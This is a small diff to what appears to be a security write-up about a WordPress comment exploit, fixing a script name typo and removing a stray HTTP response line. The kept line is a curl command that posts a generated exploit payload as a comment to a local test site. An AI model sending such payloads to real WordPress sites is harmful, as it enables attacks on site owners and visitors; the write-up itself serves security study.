@@ -126,6 +126,5 @@ echo "$sploit\n";
 ```
 
 ```bash
-curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=5' --form "comment=$( php sloit.php )"
-HTTP/1.1 100 Continue
+curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=5' --form "comment=$( php sploit.php )"
 ```
